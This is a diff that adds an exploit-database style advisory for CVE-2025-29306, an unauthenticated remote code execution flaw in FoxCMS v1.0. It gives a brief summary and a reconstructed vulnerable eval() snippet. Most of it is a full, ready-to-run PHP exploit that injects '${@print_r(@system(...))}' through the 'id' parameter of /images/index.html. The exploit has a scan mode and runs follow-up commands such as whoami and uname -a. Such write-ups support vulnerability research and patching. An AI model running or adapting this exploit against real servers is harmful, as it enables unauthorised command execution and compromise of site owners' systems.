@@ -1,0 +1,267 @@
+=============================================================================================================================================
+| # Title     : FoxCMS v1.0 php code innjection                                                                                             |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://sourceforge.net/projects/fox-cms/                                                                                   |
+=============================================================================================================================================
+
+POC : 
+
+[+] References : https://packetstorm.news/files/id/190551/ & CVE-2025-29306
+
+
+[+] Summary
+   
+    A critical remote code execution vulnerability exists in FoxCMS v1.0 that allows unauthenticated attackers to execute arbitrary operating system commands 
+	via the 'id' parameter in the /images/index.html endpoint. 
+	The vulnerability stems from improper input sanitization and direct code evaluation.
+	
+	The vulnerability exists in the FoxCMS v1.0 /images/index.html endpoint where user-supplied input in the 'id' parameter is directly evaluated without proper sanitization. 
+	The system fails to validate and sanitize user input, allowing attackers to inject and execute arbitrary PHP code.
+
+[+] Vulnerable Code Pattern:
+
+```php
+
+// In /images/index.html or related component
+
+<?php
+// Vulnerable code structure (reconstructed)
+$user_input = $_GET['id'];
+// Input is directly evaluated without sanitization
+eval("some_function($user_input);");
+// Or similar dangerous construct
+?>
+
+[+] Usage: 
+
+Usage: php exploit.php https://victim.com "id"
+
+[+] POC :
+
+<?php
+/**
+ * CVE-2025-29306 Exploit - FoxCMS v1.0 Remote Code Execution
+ * By: indoushka
+ * Vulnerability: RCE via /images/index.html id parameter
+ */
+
+class FoxCMSExploit {
+    private $colors;
+    
+    public function __construct() {
+        $this->colors = [
+            'RED'     => "\033[91m",
+            'GREEN'   => "\033[92m",
+            'YELLOW'  => "\033[93m",
+            'BLUE'    => "\033[94m",
+            'MAGENTA' => "\033[95m",
+            'CYAN'    => "\033[96m",
+            'WHITE'   => "\033[97m",
+            'BOLD'    => "\033[1m",
+            'RESET'   => "\033[0m"
+        ];
+    }
+    
+    private function color($text, $color) {
+        return $this->colors[$color] . $text . $this->colors['RESET'];
+    }
+    
+    private function showBanner() {
+        $banner = $this->color("
+
+", 'CYAN') . 
+$this->color("
+
+", 'MAGENTA') .
+$this->color("\n        CVE-2025-29306 - FoxCMS v1.0 RCE Exploit\n", 'RED') .
+$this->color("                    @indoushka\n\n", 'WHITE');
+
+        echo $banner;
+    }
+    
+    private function makeRequest($url) {
+        $context = stream_context_create([
+            'http' => [
+                'timeout' => 10,
+                'ignore_errors' => true,
+                'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+            ],
+            'ssl' => [
+                'verify_peer' => false,
+                'verify_peer_name' => false
+            ]
+        ]);
+        
+        $response = @file_get_contents($url, false, $context);
+        
+        if ($response === false) {
+            return ['success' => false, 'error' => 'Request failed'];
+        }
+        
+        return ['success' => true, 'content' => $response];
+    }
+    
+    private function extractCommandOutput($html) {
+        // Try multiple extraction methods
+        $output = '';
+        
+        // Method 1: Simple tag stripping
+        $cleaned = strip_tags($html);
+        
+        // Method 2: Look for command output patterns
+        if (preg_match('/<ul[^>]*>(.*?)<\/ul>/si', $html, $matches)) {
+            $output = strip_tags($matches[1]);
+        }
+        
+        // Method 3: Extract between common output markers
+        if (preg_match('/\b(root|bin|daemon|system)\b/i', $cleaned)) {
+            $output = $cleaned;
+        }
+        
+        // Clean up the output
+        $output = preg_replace('/\s+/', ' ', $output);
+        $output = trim($output);
+        
+        return $output ?: $cleaned;
+    }
+    
+    public function execute($target, $command) {
+        $this->showBanner();
+        
+        echo $this->color("[*] Target: ", 'BLUE') . $target . "\n";
+        echo $this->color("[*] Command: ", 'BLUE') . $command . "\n\n";
+        
+        // Construct the exploit URL
+        $payload = '${@print_r(@system("' . $command . '"))}';
+        $encodedPayload = urlencode($payload);
+        
+        $exploitUrl = rtrim($target, '/') . '/images/index.html?id=' . $encodedPayload;
+        
+        echo $this->color("[*] Sending RCE payload...", 'YELLOW') . "\n";
+        echo $this->color("[*] Exploit URL: ", 'CYAN') . $exploitUrl . "\n\n";
+        
+        $response = $this->makeRequest($exploitUrl);
+        
+        if (!$response['success']) {
+            echo $this->color("[!] Request failed: " . $response['error'], 'RED') . "\n";
+            return;
+        }
+        
+        $output = $this->extractCommandOutput($response['content']);
+        
+        if (empty(trim($output))) {
+            echo $this->color("[!] No command output received", 'RED') . "\n";
+            echo $this->color("[*] Response preview:", 'YELLOW') . "\n";
+            echo substr($response['content'], 0, 500) . "\n\n";
+        } else {
+            echo $this->color("[+] Command output:", 'GREEN') . "\n";
+            echo $this->color(str_repeat("=", 60), 'CYAN') . "\n";
+            echo $output . "\n";
+            echo $this->color(str_repeat("=", 60), 'CYAN') . "\n";
+        }
+        
+        // Test additional commands for verification
+        $this->testAdditionalCommands($target);
+    }
+    
+    private function testAdditionalCommands($target) {
+        echo $this->color("\n[*] Testing additional verification commands...", 'YELLOW') . "\n";
+        
+        $testCommands = [
+            'whoami' => 'Current user',
+            'pwd' => 'Current directory',
+            'uname -a' => 'System information'
+        ];
+        
+        foreach ($testCommands as $cmd => $description) {
+            $payload = '${@print_r(@system("' . $cmd . '"))}';
+            $encodedPayload = urlencode($payload);
+            $testUrl = rtrim($target, '/') . '/images/index.html?id=' . $encodedPayload;
+            
+            $response = $this->makeRequest($testUrl);
+            if ($response['success']) {
+                $output = $this->extractCommandOutput($response['content']);
+                if (!empty(trim($output))) {
+                    echo $this->color("[+] $description: ", 'GREEN') . trim($output) . "\n";
+                }
+            }
+        }
+    }
+    
+    public function scan($target) {
+        $this->showBanner();
+        
+        echo $this->color("[*] Scanning target for FoxCMS vulnerability: ", 'BLUE') . $target . "\n\n";
+        
+        $testUrl = rtrim($target, '/') . '/images/index.html';
+        
+        // First check if endpoint exists
+        echo $this->color("[*] Checking if /images/index.html exists...", 'YELLOW') . "\n";
+        $response = $this->makeRequest($testUrl);
+        
+        if (!$response['success']) {
+            echo $this->color("[-] Endpoint not accessible", 'RED') . "\n";
+            return false;
+        }
+        
+        echo $this->color("[+] Endpoint is accessible", 'GREEN') . "\n";
+        
+        // Test with simple command
+        $testCommand = 'echo "VULNERABLE"';
+        $payload = '${@print_r(@system("' . $testCommand . '"))}';
+        $encodedPayload = urlencode($payload);
+        
+        $exploitUrl = $testUrl . '?id=' . $encodedPayload;
+        
+        echo $this->color("[*] Testing for RCE vulnerability...", 'YELLOW') . "\n";
+        $response = $this->makeRequest($exploitUrl);
+        
+        if ($response['success'] && strpos($response['content'], 'VULNERABLE') !== false) {
+            echo $this->color("[+] Target is VULNERABLE to CVE-2025-29306!", 'RED') . "\n";
+            return true;
+        } else {
+            echo $this->color("[-] Target does not appear to be vulnerable", 'GREEN') . "\n";
+            return false;
+        }
+    }
+}
+
+// Main execution
+if (php_sapi_name() === 'cli') {
+    if ($argc < 2) {
+        echo "CVE-2025-29306 - FoxCMS v1.0 RCE Exploit\n";
+        echo "Usage:\n";
+        echo "  php exploit.php <target_url> [command]\n";
+        echo "  php exploit.php <target_url> --scan\n";
+        echo "\nExamples:\n";
+        echo "  php exploit.php https://victim.com \"id\"\n";
+        echo "  php exploit.php https://victim.com \"ls -la\"\n";
+        echo "  php exploit.php https://victim.com --scan\n";
+        echo "\nDescription:\n";
+        echo "  Exploits RCE vulnerability in FoxCMS v1.0 via /images/index.html id parameter\n";
+        exit(1);
+    }
+    
+    $target = $argv[1];
+    $command = $argv[2] ?? '--scan';
+    
+    if (!filter_var($target, FILTER_VALIDATE_URL)) {
+        echo "Error: Invalid target URL\n";
+        exit(1);
+    }
+    
+    $exploit = new FoxCMSExploit();
+    
+    if ($command === '--scan') {
+        $exploit->scan($target);
+    } else {
+        $exploit->execute($target, $command);
+    }
+} else {
+    echo "This script is intended for command line use only.\n";
+}
+?>
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
